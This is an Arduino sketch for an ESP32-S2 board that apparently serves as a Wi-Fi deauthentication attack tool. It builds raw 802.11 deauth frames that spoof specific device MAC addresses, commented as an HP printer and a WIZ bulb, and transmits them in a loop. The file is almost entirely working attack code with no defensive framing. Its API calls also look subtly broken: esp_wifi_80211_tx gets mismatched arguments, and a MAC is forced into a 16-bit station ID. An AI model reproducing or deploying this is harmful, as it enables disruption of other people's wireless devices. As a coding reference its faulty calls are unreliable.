#include <WiFi.h>
#include <esp_wifi.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>

// Replace with your Wi-Fi network credentials
const char* ssid = "XXXXXXX";
const char* password = "XXXXXXXXXXXX";

Adafruit_ST7789 tft = Adafruit_ST7789(TFT_CS, TFT_DC, TFT_RST);

void setup() {

  Serial.begin(115200);

  WiFi.softAP("AdafruitESP32-S2");

  // turn on backlight
  pinMode(TFT_BACKLITE, OUTPUT);
  digitalWrite(TFT_BACKLITE, HIGH);
  
  tft.init(135, 240);
  tft.setRotation(3);
  tft.fillScreen(ST77XX_BLACK);
  tft.setTextSize(2);

  tft.print("Connecting");

  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    tft.print(".");
  }
  tft.println(WiFi.localIP());
  delay(1000);
  tft.fillScreen(ST77XX_BLACK);
  tft.setCursor(0,0);
}
void loop() {
  if(Serial.read() != -1){
    uint8_t mac[] = {0x58, 0x20, 0xB1, 0x59, 0x78, 0x79};
    uint16_t mac16 = (mac[0] << 8) | mac[1];
    esp_wifi_deauth_sta(mac16);
  }

  // Send two deauthentication packets
  for (int i = 0; i < 2; i++) {
    //WIZ light bulb MAC
    //uint8_t mac[] = {0x44, 0x4F, 0x8E, 0x9A, 0xFF, 0x8A};
    //HP Printer
    uint8_t mac[] = {0x58, 0x20, 0xB1, 0x59, 0x78, 0x79};
    wifi_pkt_rx_ctrl_t rx_ctrl = {0};
    uint8_t packet[] = {
      // type, subtype, flags (C0: deauth) (A0: disassociate)
      0xC0, 0x00, 0x3A,
      // duration
      0x00, 0x00,
      // receiver MAC address (broadcast)
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
      // transmitter MAC address (this device)
      mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
      // BSSID (this device)
      //mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
      0x7E, 0xD2, 0x94, 0x44, 0xBA, 0x28,
      // fragment and sequence number
      0x00, 0x00,
      // reason code (0 = deauthentication) (1 = unspecified reason)
      0x03, 0x00
      //0x01, 0x00
    };
    void* packet_ptr = (void*)packet;  // Cast packet to void*
    esp_wifi_80211_tx(WIFI_IF_STA, &rx_ctrl, (int)packet, sizeof(packet));
    delay(1000);
  }

  tft.print("Client connected: ");
  tft.println(WiFi.softAPgetStationNum());
  delay(5000);
  tft.fillScreen(ST77XX_BLACK);
  tft.setCursor(0,0);
  
  // Get the current Wi-Fi interface
  wifi_mode_t current_mode = WiFi.getMode();
  esp_interface_t current_interface = (current_mode == WIFI_MODE_AP) ? ESP_IF_WIFI_AP : ESP_IF_WIFI_STA;
}
